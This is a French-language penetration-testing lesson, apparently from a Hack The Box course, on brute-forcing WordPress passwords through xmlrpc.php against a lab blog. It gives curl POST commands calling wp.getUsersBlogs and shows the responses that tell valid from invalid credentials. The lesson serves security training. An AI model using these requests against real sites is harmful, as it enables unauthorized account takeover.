Se connecter
============

* * * * *

Une fois que nous sommes armés d'une liste d'utilisateurs valides, nous pouvons lancer une attaque par force brute de mot de passe pour tenter d'accéder au backend WordPress. Cette attaque peut être effectuée via la page de connexion ou la `xmlrpc.php`page.

Si notre requête POST `xmlrpc.php`contient des informations d'identification valides, nous recevrons le résultat suivant :

#### cURL - Requête POST

  cURL - Requête POST

```
dsgsec@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <params>
    <param>
      <value>
      <array><data>
  <value><struct>
  <member><name>isAdmin</name><value><boolean>1</boolean></value></member>
  <member><name>url</name><value><string>http://blog.inlanefreight.com/</string></value></member>
  <member><name>blogid</name><value><string>1</string></value></member>
  <member><name>blogName</name><value><string>Inlanefreight</string></value></member>
  <member><name>xmlrpc</name><value><string>http://blog.inlanefreight.com/xmlrpc.php</string></value></member>
</struct></value>
</data></array>
      </value>
    </param>
  </params>
</methodResponse>

```

Si les informations d'identification ne sont pas valides, nous recevrons une `403 faultCode`erreur.

#### Identifiants invalides - 403 interdit

  Identifiants invalides - 403 interdit

```
dsgsec@htb[/htb]$ curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>asdasd</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php

<?xml version="1.0" encoding="UTF-8"?>
<methodResponse>
  <fault>
    <value>
      <struct>
        <member>
          <name>faultCode</name>
          <value><int>403</int></value>
        </member>
        <member>
          <name>faultString</name>
          <value><string>Incorrect username or password.</string></value>
        </member>
      </struct>
    </value>
  </fault>
</methodResponse>

```

Ces dernières sections ont présenté plusieurs méthodes pour effectuer une énumération manuelle sur une instance WordPress. Il est essentiel de comprendre les méthodes manuelles avant d'essayer d'utiliser des outils automatisés. Même si les outils automatisés accélèrent considérablement le processus de test d'intrusion, il est de notre responsabilité de comprendre leur impact sur les systèmes que nous évaluons. Une solide compréhension des méthodes d'énumération manuelle aidera également au dépannage si des outils automatisés ne fonctionnent pas correctement ou fournissent un résultat inattendu.
